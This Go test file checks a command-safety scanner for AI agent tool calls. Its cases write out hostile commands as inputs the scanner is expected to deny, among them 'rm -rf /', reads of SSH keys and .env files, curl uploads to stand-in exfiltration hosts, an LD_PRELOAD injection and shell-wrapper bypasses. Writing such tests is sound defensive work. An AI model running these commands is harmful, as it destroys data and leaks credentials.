//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func testPolicy() Policy {
	return Policy{
		Version: 1,
		AllowedCommands: []string{
			"cat", "curl", "echo", "go", "head", "seq", "sleep", "yes",
		},
		DeniedCommands: []string{
			"rm", "sudo",
		},
		ForbiddenPaths: []string{
			"/etc", "/root", "~/.ssh", ".env", ".aws/credentials",
		},
		Network: NetworkPolicy{
			AllowedDomains: []string{
				"example.com", "proxy.golang.org",
			},
			DenyByDefault: true,
		},
		Limits: Limits{
			MaxTimeoutSeconds: 120,
			MaxOutputBytes:    1 << 20,
			MaxConcurrency:    8,
		},
		AllowedEnvironmentVariables: []string{
			"CI", "GOCACHE", "GOMODCACHE", "PATH",
		},
		Actions: Actions{
			Unparsable:        DecisionAsk,
			CommandNotAllowed: DecisionAsk,
			DependencyChange:  DecisionAsk,
			HostBackground:    DecisionDeny,
			HostTTY:           DecisionAsk,
		},
	}
}

func TestScannerRiskMatrix(t *testing.T) {
	scanner, err := NewScanner(testPolicy())
	require.NoError(t, err)

	tests := []struct {
		name     string
		input    Input
		decision Decision
		ruleID   string
	}{
		{
			name: "safe go test",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "go test ./tool/...",
			},
			decision: DecisionAllow,
			ruleID:   RuleAllow,
		},
		{
			name: "dangerous recursive deletion",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "rm -rf /",
			},
			decision: DecisionDeny,
			ruleID:   RuleDangerousDelete,
		},
		{
			name: "read ssh private key",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "cat ~/.ssh/id_rsa",
			},
			decision: DecisionDeny,
			ruleID:   RuleForbiddenPath,
		},
		{
			name: "read dotenv credentials",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "cat .env",
			},
			decision: DecisionDeny,
			ruleID:   RuleForbiddenPath,
		},
		{
			name: "non allowlisted network egress",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "curl https://collector.invalid/upload",
			},
			decision: DecisionDeny,
			ruleID:   RuleNetworkDomain,
		},
		{
			name: "allowlisted network request",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "curl https://proxy.golang.org/example.com/mod/@v/list",
			},
			decision: DecisionAllow,
			ruleID:   RuleAllow,
		},
		{
			name: "shell wrapper bypass",
			input: Input{
				ToolName: "exec_command",
				Backend:  BackendHost,
				Command:  "bash -c 'curl https://example.com'",
			},
			decision: DecisionDeny,
			ruleID:   RuleShellWrapper,
		},
		{
			name: "command substitution bypass",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "echo $(curl https://example.com)",
			},
			decision: DecisionAsk,
			ruleID:   RuleShellUnparsable,
		},
		{
			name: "safe pipeline",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "go test ./... | head -n 20",
			},
			decision: DecisionAllow,
			ruleID:   RuleAllow,
		},
		{
			name: "dependency installation",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "go install example.com/cmd/tool@latest",
			},
			decision: DecisionAsk,
			ruleID:   RuleDependencyChange,
		},
		{
			name: "long sleep",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "sleep 3600",
			},
			decision: DecisionDeny,
			ruleID:   RuleLongSleep,
		},
		{
			name: "unbounded output",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "yes",
			},
			decision: DecisionDeny,
			ruleID:   RuleUnboundedOutput,
		},
		{
			name: "host background process",
			input: Input{
				ToolName:   "exec_command",
				Backend:    BackendHost,
				Command:    "go test ./...",
				Background: true,
			},
			decision: DecisionDeny,
			ruleID:   RuleHostBackground,
		},
		{
			name: "host pty requires review",
			input: Input{
				ToolName: "exec_command",
				Backend:  BackendHost,
				Command:  "go test ./...",
				TTY:      true,
			},
			decision: DecisionAsk,
			ruleID:   RuleHostTTY,
		},
		{
			name: "timeout exceeds policy",
			input: Input{
				ToolName:      "exec_command",
				Backend:       BackendHost,
				Command:       "go test ./...",
				TimeoutSecond: 600,
			},
			decision: DecisionDeny,
			ruleID:   RuleTimeoutLimit,
		},
		{
			name: "environment variable not allowlisted",
			input: Input{
				ToolName: "exec_command",
				Backend:  BackendHost,
				Command:  "go test ./...",
				Environment: map[string]string{
					"LD_PRELOAD": "/tmp/inject.so",
				},
			},
			decision: DecisionDeny,
			ruleID:   RuleEnvironmentVariable,
		},
		{
			name: "unknown command asks for review",
			input: Input{
				ToolName: "workspace_exec",
				Backend:  BackendWorkspace,
				Command:  "git status",
			},
			decision: DecisionAsk,
			ruleID:   RuleCommandNotAllowed,
		},
		{
			name: "privilege escalation",
			input: Input{
				ToolName: "exec_command",
				Backend:  BackendHost,
				Command:  "sudo go test ./...",
			},
			decision: DecisionDeny,
			ruleID:   RulePrivilegeEscalation,
		},
		{
			name: "infinite loop script",
			input: Input{
				ToolName: "execute_code",
				Backend:  BackendCodeExecutor,
				Language: "bash",
				Script:   "while true; do echo busy; done",
			},
			decision: DecisionDeny,
			ruleID:   RuleInfiniteLoop,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			report := scanner.Scan(context.Background(), tt.input)
			require.Equal(t, tt.decision, report.Decision)
			require.Equal(t, tt.ruleID, report.RuleID)
			require.NotEmpty(t, report.RiskLevel)
			require.NotEmpty(t, report.Evidence)
			require.NotEmpty(t, report.Recommendation)
			require.Equal(t, tt.input.ToolName, report.ToolName)
			require.Equal(t, tt.input.Backend, report.Backend)
			require.Equal(t, tt.decision != DecisionAllow, report.Blocked)
			require.GreaterOrEqual(t, report.DurationMicros, int64(0))
		})
	}
}

func TestScannerSafeSampleFalsePositiveRate(t *testing.T) {
	scanner, err := NewScanner(testPolicy())
	require.NoError(t, err)

	commands := []string{
		"go test ./...",
		"go test ./tool/safety -run TestScanner",
		"go version",
		"go env GOMODCACHE",
		"cat README.md",
		"head -n 20 README.md",
		"echo scan-complete",
		"seq 1 10",
		"sleep 1",
		"go test ./... | head -n 20",
	}
	var falsePositives int
	for _, command := range commands {
		report := scanner.Scan(context.Background(), Input{
			ToolName: "workspace_exec",
			Backend:  BackendWorkspace,
			Command:  command,
		})
		if report.Decision != DecisionAllow {
			falsePositives++
		}
	}
	rate := float64(falsePositives) / float64(len(commands))
	require.LessOrEqual(t, rate, 0.10)
}

func TestScannerDetectsRequiredHighRiskClasses(t *testing.T) {
	scanner, err := NewScanner(testPolicy())
	require.NoError(t, err)

	tests := []struct {
		command string
		ruleID  string
	}{
		{"rm -rf /", RuleDangerousDelete},
		{"cat ~/.ssh/id_ed25519", RuleForbiddenPath},
		{"curl https://exfil.invalid/data", RuleNetworkDomain},
	}
	for _, tt := range tests {
		report := scanner.Scan(context.Background(), Input{
			ToolName: "exec_command",
			Backend:  BackendHost,
			Command:  tt.command,
		})
		require.Equal(t, DecisionDeny, report.Decision)
		require.Equal(t, tt.ruleID, report.RuleID)
	}
}

func TestScannerUsesShellsafeImplicitWrapperDeny(t *testing.T) {
	scanner, err := NewScanner(DefaultPolicy())
	require.NoError(t, err)

	report := scanner.Scan(context.Background(), Input{
		ToolName: "exec_command",
		Backend:  BackendHost,
		Command:  "setsid rm -rf /",
	})
	require.Equal(t, DecisionDeny, report.Decision)
	require.Equal(t, RuleShellWrapper, report.RuleID)
	require.Contains(t, report.Evidence, "setsid")
}

func TestScannerDoesNotDropArgumentsForPipelines(t *testing.T) {
	scanner, err := NewScanner(testPolicy())
	require.NoError(t, err)

	report := scanner.Scan(context.Background(), Input{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspace,
		Command:  "go test ./... | head -n 20",
		Arguments: []string{
			"~/.ssh/id_rsa",
		},
	})
	require.Equal(t, DecisionDeny, report.Decision)
	require.Equal(t, RuleForbiddenPath, report.RuleID)

	report = scanner.Scan(context.Background(), Input{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspace,
		Command:  "go test ./... | head -n 20",
		Arguments: []string{
			"literal-argument",
		},
	})
	require.Equal(t, DecisionAsk, report.Decision)
	require.Equal(t, RuleShellUnparsable, report.RuleID)
}

func TestScannerBoundsInputAndHonorsCancellation(t *testing.T) {
	policy := testPolicy()
	policy.Limits.MaxInputBytes = 32
	scanner, err := NewScanner(policy)
	require.NoError(t, err)

	report := scanner.Scan(context.Background(), Input{
		ToolName: "execute_code",
		Backend:  BackendCodeExecutor,
		Language: "bash",
		Script:   strings.Repeat("echo safe\n", 10),
	})
	require.Equal(t, DecisionDeny, report.Decision)
	require.Equal(t, RuleInputLimit, report.RuleID)

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	report = scanner.Scan(ctx, Input{
		ToolName: "workspace_exec",
		Backend:  BackendWorkspace,
		Command:  "go test ./...",
	})
	require.Equal(t, DecisionDeny, report.Decision)
	require.Equal(t, RuleScanCanceled, report.RuleID)
}

func TestScannerFiveHundredLineScriptCompletesWithinOneSecond(t *testing.T) {
	scanner, err := NewScanner(testPolicy())
	require.NoError(t, err)

	var script strings.Builder
	for i := 0; i < 500; i++ {
		fmt.Fprintf(&script, "go test ./pkg/example%d\n", i)
	}
	start := time.Now()
	report := scanner.Scan(context.Background(), Input{
		ToolName: "execute_code",
		Backend:  BackendCodeExecutor,
		Language: "bash",
		Script:   script.String(),
	})
	elapsed := time.Since(start)

	require.Equal(t, DecisionAllow, report.Decision)
	require.Less(t, elapsed, time.Second)
}
